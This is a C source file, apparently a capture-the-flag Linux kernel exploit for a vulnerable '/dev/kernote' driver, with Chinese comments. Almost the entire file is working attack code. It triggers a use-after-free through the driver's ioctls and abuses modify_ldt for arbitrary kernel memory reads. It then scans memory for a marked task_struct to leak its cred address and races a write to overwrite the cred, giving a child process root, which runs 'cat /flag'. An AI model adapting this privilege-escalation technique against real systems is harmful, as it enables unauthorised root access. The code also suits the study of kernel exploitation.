#define _GNU_SOURCE              /* 参见 feature_test_macros(7) */
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <sched.h>
#include <errno.h>
#include <time.h>
#include <pty.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/prctl.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/sem.h>
#include <pthread.h>
#include <sched.h>

typedef unsigned long long uLL;
typedef long long LL;

int fd;

void Add(int idx){
    ioctl(fd, 0x6667, idx);
}

void Choice(int idx){
    ioctl(fd, 0x6666, idx);
}

void Free(int idx){
    ioctl(fd, 0x6668, idx);
}

void Write(uLL val){
    ioctl(fd, 0x6669, val);
}

void Show(int idx){
    ioctl(fd, 0x666A, idx);
}

struct user_desc {
	unsigned int  entry_number;
	unsigned int  base_addr;
	unsigned int  limit;
	unsigned int  seg_32bit:1;
	unsigned int  contents:2;
	unsigned int  read_exec_only:1;
	unsigned int  limit_in_pages:1;
	unsigned int  seg_not_present:1;
	unsigned int  useable:1;
	unsigned int  lm:1;
};

#define PAGE_OFFSET_BASE 0xffff888000000000

//set task_struct->comm
uLL comm[2]={0xdeadbeefdeadbeef, 0x0002030405060708}; //16B's last B = 0x00

//泄露p_pid进程的cred地址
uLL leakCred(int p_pid){

    //get a UAF obj
    Add(0);
    Choice(0);
    Free(0);

    //note = current->mm->context.ldt
    struct user_desc desc;
    memset(&desc, 0, sizeof(desc));
    desc.base_addr = 0xff0000;
    desc.entry_number = 0x8000/8;
    int ret = syscall(SYS_modify_ldt, 0x1, &desc, sizeof(desc));
    printf("%d\n", ret);

    //search direct mapping memory
    uLL kernel_base = PAGE_OFFSET_BASE;
    while(1){
        uLL tmp;
        Write(kernel_base);
        int ret = syscall(SYS_modify_ldt, 0x0, &tmp, 8);
        if(ret>=0)
            break;
        kernel_base+= 0x4000000;
    }
    printf("kernel_base: %p\n", kernel_base);

    //search task_struct by comm[]
    int pipe_fd[2];
    pipe(pipe_fd);
    uLL task_addr = kernel_base;
    uLL cred;
    while(1){   
        //set ldt->entries
        Write(task_addr);

        //read task_addr
        if(fork()==0){
            uLL tmp[0x8000/8];
            syscall(SYS_modify_ldt, 0x0, &tmp, 0x8000);

            //compare comm
            for(int i=0; i<(0x1000); i+=0x1)
                if(tmp[i]==comm[0]&&tmp[i+1]==comm[1]){
                    printf("task_addr: %p\n", task_addr+i*8); 
                    uLL cred = tmp[i-2]; //get cred
                    uLL real_cred = tmp[i-3];
                    int pid = tmp[i-58]; //(0xad0+0x18-0x918)/8
                    printf("%d %p %p\n\n", pid, real_cred, cred);
                    //check cred
                    if( cred==real_cred \
                        &&real_cred>PAGE_OFFSET_BASE \
                        && cred>PAGE_OFFSET_BASE \
                        && pid==p_pid){ 
                        write(pipe_fd[1], &cred, 8);
                        exit(0);
                    }

                }
            exit(-1);
        }

        int stat;
        wait(&stat);
        if(stat==0){
            read(pipe_fd[0], &cred, 8);
            break;
        }

        task_addr+=0x8000;
    }
  
    return cred;
}

//有root权限时要执行的
void root_func(void){
    prctl(PR_SET_NAME, &comm);
    sleep(5);
    while(1){
        sleep(1);
        printf("euid: %d uid:%d\n", geteuid(), getuid());
        setreuid(0,0);
        setregid(0,0);
        system("cat /flag");
    }

}

int main(void)
{
    setbuf(stdout, 0);
    fd = open("/dev/kernote", O_RDWR);

    //先开一个进程执行root命令, 后面尝试提权这个进程的
    int root_pid = fork();
    if(root_pid==0){
        root_func();
        sleep(1000);
    }

    //泄露上面那个进程的cred地址
    int leak_cred_pipe[2];
    pipe(leak_cred_pipe);
    int leak_cred_pid = fork();
    if(leak_cred_pid==0){
        uLL cred = leakCred(root_pid);
        write(leak_cred_pipe[1], &cred, 8);
        sleep(1000);    //repalce exit() to avoid kernel crash
    }
    uLL cred;
    read(leak_cred_pipe[0], &cred, 8);
    printf("cred: %p\n", cred);

  
    cpu_set_t cpu;
    CPU_ZERO(&cpu);

    //write_ldt()=>alloc_ldt_struct()中memcpy的长度
    #define MEMCPY_SIZE 0x1f00

    //开启一个新进程来获取新的ldt
    if(fork()==0){
        CPU_SET(1, &cpu);
        sched_setaffinity(0, sizeof(cpu), &cpu);

        sleep(1); //等待主进程先开始Write(cred+4-MEMCPY_SIZE*8);

        //get a UAF obj
        Add(1);
        Choice(1);
        Free(1);

        //note=child->mm->context.ldt
        struct user_desc desc;
        memset(&desc, 0, sizeof(desc));
        desc.entry_number=2+MEMCPY_SIZE;
        syscall(SYS_modify_ldt, 0x1, &desc, sizeof(desc));
        sleep(1000);    //repalce exit() to avoid kernel crash
    }

    CPU_SET(0, &cpu);
    sched_setaffinity(0, sizeof(cpu), &cpu);
    while(1){
        Write(cred+4-MEMCPY_SIZE*8);
    }
   

    sleep(1000);    //repalce exit() to avoid kernel crash
    return 0;
}
/*
0xffff888004cae6c0
*/
